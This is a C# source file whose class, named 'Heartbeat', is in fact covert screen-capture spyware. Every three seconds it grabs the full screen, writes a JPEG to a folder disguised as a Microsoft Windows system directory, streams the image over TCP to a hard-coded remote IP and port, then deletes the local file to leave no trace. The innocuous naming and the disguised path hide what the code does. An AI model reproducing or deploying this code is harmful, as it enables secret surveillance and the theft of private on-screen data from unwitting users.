using System;
using System.IO;
using System.Timers;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Timer = System.Timers.Timer;
using System.Net.Sockets;
using System.Text;

namespace resource
{
    class Heartbeat
    {
        private readonly Timer _timer;
        const string IMAGE_DIR = @"C:\ProgramData\Microsoft\Windows\Telescope\resource";
        const string SERVER_IP = "10.10.10.241";
        const int CONNECT_PORT = 10001;
        const int BUFFER_SIZE = 10240;
        static string fullPathName = "";
        static bool checkFolderFlag = true;
        public Heartbeat()
        {
            string dir = IMAGE_DIR;
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
            _timer = new Timer(3000) { AutoReset = true };
            _timer.Elapsed += TimerElapsed;
        }
        async private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            //Console.WriteLine("----------------------------------");
            if(checkFolderFlag) CheckFolder();
            MainAction();
        }
        static void CheckFolder()
        {
            string dir = IMAGE_DIR;
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
            checkFolderFlag = false;
        }
        static void MainAction()
        {
            try
            {
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        try
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"cannot catch screen-->{e}");
                            return;
                        }
                    }
                    try
                    {
                        string path = IMAGE_DIR;
                        string FileName = Path.Combine(path, DateTime.Now.ToString("yyyyMMddHHmmss") + ".jpg");
                        fullPathName = Path.GetFullPath(FileName);
                        bitmap.Save(fullPathName, ImageFormat.Jpeg);
                        Console.WriteLine($"fileName-->{fullPathName}");
                        SendImage(fullPathName);
                        File.Delete(fullPathName);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"EEEE2-->{e}");
                        return;
                    }
                }
            }
            catch(Exception e)
            {
                Console.WriteLine($"EEEE3-->{e}");
                return;
            }
        }
        static void SendImage(string filename)
        {
            try
            {
                var client = new TcpClient(SERVER_IP, CONNECT_PORT);
                //Console.WriteLine("Server is alive.");

                using (var cs = client.GetStream())
                {
                    // Send filename
                    byte[] fNameBytes = Encoding.Unicode.GetBytes(Path.GetFileName(filename));
                    cs.WriteByte((byte)fNameBytes.Length);
                    cs.Write(fNameBytes, 0, fNameBytes.Length);

                    using (var fs = File.OpenRead(filename))
                    {
                        // Send image data
                        byte[] buffer = new byte[BUFFER_SIZE];
                        while (true)
                        {
                            int r = fs.Read(buffer, 0, BUFFER_SIZE);
                            if (r == 0)
                                break;

                            cs.Write(buffer, 0, r);
                        }
                    }
                }
                client.Close();
            }
            catch (SocketException)
            {
                File.Delete(fullPathName);
                Console.WriteLine("Server is dead.");
                //return false;
            }
        }
        public void Start()
        {
            _timer.Start();
        }
        public void Stop()
        {
            _timer.Stop();
        }
    }
}
